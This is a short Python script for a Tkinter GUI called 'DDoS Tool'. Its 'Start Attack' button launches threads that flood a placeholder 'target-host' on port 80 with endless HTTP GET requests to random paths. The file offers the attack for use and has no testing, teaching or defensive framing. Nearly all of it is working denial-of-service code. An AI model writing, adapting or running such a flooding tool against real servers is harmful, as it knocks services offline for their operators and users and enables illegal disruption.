import tkinter as tk
import http.client
import random
import threading

# Target host details
target_host = "target-host"
target_port = 80

# Function to perform the DDoS attack
def ddos_attack():
    while True:
        try:
            # Establish an HTTP connection to the target host
            conn = http.client.HTTPConnection(target_host, target_port)
            
            # Generate a random path for the request
            rand_path = "/" + str(random.randint(1, 1000))
            
            # Send the GET request with the random path
            conn.request("GET", rand_path)
            
            # Get the response from the server
            response = conn.getresponse()
            
            # Close the connection
            conn.close()
            
        except:
            # If an error occurs, close the connection and continue the script
            conn.close()
            continue

# Function to start the attack
def start_attack():
    attack_thread = threading.Thread(target=ddos_attack)
    attack_thread.start()

# Create the GUI window
window = tk.Tk()
window.title("DDoS Tool")
window.geometry("300x100")

# Create and position the start button
start_button = tk.Button(window, text="Start Attack", command=start_attack)
start_button.place(x=110, y=40)

# Run the GUI
window.mainloop()